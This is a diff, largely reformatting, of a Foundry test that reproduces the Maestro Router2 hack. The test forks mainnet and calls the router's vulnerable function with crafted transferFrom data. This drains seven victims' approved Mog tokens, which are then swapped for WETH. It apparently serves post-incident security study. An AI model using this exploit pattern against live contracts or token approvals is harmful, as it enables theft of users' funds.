@@ -7,7 +7,7 @@ import "./interface.sol";
 // @KeyInfo -- Total Lost : ~280 ETH
 // Attacker : https://etherscan.io/address/0xce6397e53c13ff2903ffe8735e478d31e648a2c6
 // Attack Contract : https://etherscan.io/address/0xe6c6e86e04de96c4e3a29ad480c94e7a471969ab
-// Attacker Transaction : 
+// Attacker Transaction :
 // https://etherscan.io/tx/0xc087fbd68b9349b71838982e789e204454bfd00eebf9c8e101574376eb990d92 14 ETH
 // https://etherscan.io/tx/0xede874f9a4333a26e97d3be9d1951e6a3c2a8861e4e301787093cfb1293d4756 28.5 ETH
 // https://etherscan.io/tx/0xe60c5a3154094828065049121e244dfd362606c2a5390d40715ba54699ba9da6 75 ETH
@@ -25,9 +25,7 @@ import "./interface.sol";
 // https://twitter.com/Phalcon_xyz/status/1717014871836098663
 // https://twitter.com/BeosinAlert/status/1717013965203804457
 
-interface IMaestroRouter {
-
-}
+interface IMaestroRouter {}
 
 // The hacker sent multiple transactions to attack, just taking the first transaction as an example.
 
@@ -50,7 +48,7 @@ contract MaestroRouter2Exploit is Test {
     }
 
     function testExploit() public {
-        cheats.rollFork(18423219);
+        cheats.rollFork(18_423_219);
         emit log_named_decimal_uint("Attacker Mog balance before exploit", Mog.balanceOf(address(this)), Mog.decimals());
 
         address[] memory victims = new address[](7);
@@ -62,23 +60,25 @@ contract MaestroRouter2Exploit is Test {
         victims[5] = 0x968907878bDF60638FFdD5E4759289941333bf94;
         victims[6] = 0xA5162195e6CB7483eea8bA878d147b0E90519c64;
         bytes4 vulnFunctionSignature = hex"9239127f";
-        for (uint i = 0; i < victims.length; i++) {
+        for (uint256 i = 0; i < victims.length; i++) {
             uint256 allowance = Mog.allowance(victims[i], address(router));
             uint256 balance = Mog.balanceOf(victims[i]);
-            balance = allowance < balance? allowance:balance;
-            bytes memory transferFromData = abi.encodeWithSignature("transferFrom(address,address,uint256)", victims[i], address(this), balance);
+            balance = allowance < balance ? allowance : balance;
+            bytes memory transferFromData =
+                abi.encodeWithSignature("transferFrom(address,address,uint256)", victims[i], address(this), balance);
             bytes memory data = abi.encodeWithSelector(vulnFunctionSignature, Mog, transferFromData, uint8(0), false);
-            (bool success, ) = address(router).call(data);
+            (bool success,) = address(router).call(data);
         }
         uint256 MogBalance = Mog.balanceOf(address(this));
-        emit log_named_decimal_uint("Attacker Mog balance after exploit", MogBalance , Mog.decimals());
-        
+        emit log_named_decimal_uint("Attacker Mog balance after exploit", MogBalance, Mog.decimals());
+
         address[] memory path = new address[](2);
         path[0] = address(Mog);
         path[1] = address(WETH);
         Mog.approve(address(UniRouter), MogBalance);
-        UniRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(MogBalance, 0, path, address(this), block.timestamp);
+        UniRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
+            MogBalance, 0, path, address(this), block.timestamp
+        );
         emit log_named_decimal_uint("Attacker ETH balance after exploit", WETH.balanceOf(address(this)), 18);
     }
-
 }
